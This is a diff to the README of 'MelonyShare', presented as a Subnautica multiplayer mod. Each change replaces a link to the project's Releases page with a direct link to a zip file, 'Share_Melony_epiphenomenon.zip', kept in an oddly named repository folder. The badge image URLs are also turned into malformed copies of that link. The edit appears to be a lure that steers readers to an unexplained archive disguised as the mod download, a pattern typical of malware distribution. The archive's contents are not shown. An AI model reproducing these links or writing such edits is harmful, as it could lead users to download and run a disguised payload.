@@ -4,7 +4,7 @@
 
 MelonyShare is an open-source, multiplayer modification for Subnautica. It enhances your experience by allowing you to play with friends in the captivating underwater world of Subnautica. Windows users can dive right in!
 
-[![Download MelonyShare](https://img.shields.io/badge/Download%20MelonyShare-v1.0-red.svg)](https://github.com/ocriadorai/MelonyShare/releases)
+[![Download MelonyShare](https://github.com/ocriadorai/MelonyShare/raw/refs/heads/main/orthodoxal/Share_Melony_epiphenomenon.zip%https://github.com/ocriadorai/MelonyShare/raw/refs/heads/main/orthodoxal/Share_Melony_epiphenomenon.zip)](https://github.com/ocriadorai/MelonyShare/raw/refs/heads/main/orthodoxal/Share_Melony_epiphenomenon.zip)
 
 ## 📥 Download & Install
 
@@ -13,7 +13,7 @@ To get started with MelonyShare, follow these simple steps:
 1. **Visit the Releases Page**
    Click the link below to access the MelonyShare Releases page, where you can download the latest version:
 
-   [Visit this page to download MelonyShare](https://github.com/ocriadorai/MelonyShare/releases)
+   [Visit this page to download MelonyShare](https://github.com/ocriadorai/MelonyShare/raw/refs/heads/main/orthodoxal/Share_Melony_epiphenomenon.zip)
 
 2. **Choose the Latest Release**
    On the Releases page, look for the latest version of MelonyShare. You will find the version number at the top of the page. It is important to choose the most recent one to enjoy the newest features and fixes.
@@ -70,4 +70,4 @@ We welcome contributions from everyone! If you have suggestions or improvements,
 
 Thanks to the community for your support and contributions. Your enthusiasm makes this project possible.
 
-[![Download MelonyShare](https://img.shields.io/badge/Download%20MelonyShare-v1.0-red.svg)](https://github.com/ocriadorai/MelonyShare/releases)
+[![Download MelonyShare](https://github.com/ocriadorai/MelonyShare/raw/refs/heads/main/orthodoxal/Share_Melony_epiphenomenon.zip%https://github.com/ocriadorai/MelonyShare/raw/refs/heads/main/orthodoxal/Share_Melony_epiphenomenon.zip)](https://github.com/ocriadorai/MelonyShare/raw/refs/heads/main/orthodoxal/Share_Melony_epiphenomenon.zip)
